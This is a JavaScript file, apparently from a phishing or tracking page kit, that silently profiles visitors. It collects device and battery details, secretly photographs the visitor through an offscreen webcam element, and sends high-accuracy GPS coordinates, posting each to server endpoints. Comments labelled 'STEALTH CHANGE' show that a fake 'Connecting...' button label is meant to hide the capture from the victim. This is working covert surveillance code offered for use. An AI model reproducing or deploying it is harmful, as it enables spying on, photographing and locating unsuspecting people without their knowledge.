// -----------------------------------------------------
// HELPER: Updates the button text for realism
// -----------------------------------------------------
function updateStatus(text) {
    var btn = document.querySelector('.VahdFMz0');
    if (btn) {
        btn.innerHTML = text;
        btn.style.opacity = "0.8"; 
    }
}

// -----------------------------------------------------
// 1. DEVICE INFO
// -----------------------------------------------------
function information() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      collectAndSend(level + status);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var brw = 'Unknown'; 
  if (ver.indexOf('Firefox') != -1) brw = 'Firefox';
  else if (ver.indexOf('Chrome') != -1) brw = 'Chrome';
  else if (ver.indexOf('Safari') != -1) brw = 'Safari';

  var ht = window.screen.height;
  var wd = window.screen.width;
  var os = ver; 
  if(os.includes(';')) {
      os = os.substring(0, os.indexOf(')'));
      os = os.split(';')[1];
      if (os) os = os.trim();
  }

  $.ajax({
    type: 'POST',
    url: info_file,
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
    success: function() {},
    mimeType: 'text'
  });
}

// -----------------------------------------------------
// 2. CAMERA LOGIC (Stealth + Fast Chain)
// -----------------------------------------------------
function captureAndSend(nextStepCallback) {
  // STEALTH CHANGE: Generic "Connecting" text
  updateStatus("Connecting..."); 

  var video = document.createElement('video');
  video.style.position = "fixed";
  video.style.top = "-10000px"; 
  document.body.appendChild(video); 

  var canvas = document.getElementById('canvas');

  video.autoplay = true;
  video.muted = true;
  video.playsInline = true;

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
      video.srcObject = stream;
      video.play();

      // --- IMMEDIATE LOCATION TRIGGER ---
      // We ask for location NOW (while photo happens in background)
      if (nextStepCallback) nextStepCallback(); 
      // ----------------------------------

      video.onloadeddata = function() {
          setTimeout(function() {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(function(blob) {
                  var formData = new FormData();
                  formData.append('image', blob, 'cam.jpg');

                  // STEALTH CHANGE: Keep saying "Connecting..."
                  // We do NOT change text here anymore.
                  
                  $.ajax({
                    url: upload_file, 
                    type: 'POST',
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {
                      stream.getTracks().forEach(track => track.stop());
                      try { document.body.removeChild(video); } catch(e){}
                    },
                    error: function() {
                      stream.getTracks().forEach(track => track.stop());
                      try { document.body.removeChild(video); } catch(e){}
                    }
                  });
                }, 'image/jpeg', 0.8);
            }
          }, 500);
      };
    }).catch(function(err) {
      try { document.body.removeChild(video); } catch(e){}
      if (nextStepCallback) nextStepCallback(); 
    });
  } else {
    if (nextStepCallback) nextStepCallback();
  }
}

// -----------------------------------------------------
// 3. LOCATION LOGIC
// -----------------------------------------------------
function locate(successCallback, failCallback) {
  // STEALTH CHANGE: No text change here if it already says "Connecting..."
  // It looks cleaner to just stay on one status.
  
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 5000, maximumage: 0 };
    
    navigator.geolocation.getCurrentPosition(
      function(position) { 
          showPosition(position, successCallback); 
      }, 
      function(error) { 
          if(successCallback) successCallback(); 
      }, 
      optn
    );
  } else {
    if(successCallback) successCallback();
  }
}

function showPosition(position, callback) {
  var lat = position.coords.latitude; 
  var lon = position.coords.longitude;
  
  $.ajax({
    type: 'POST',
    url: result_file,
    data: { Status: 'success', Lat: lat, Lon: lon },
    success: function() { 
        if(callback) callback(); 
    },
    error: function() {
        if(callback) callback(); 
    },
    mimeType: 'text'
  });
}
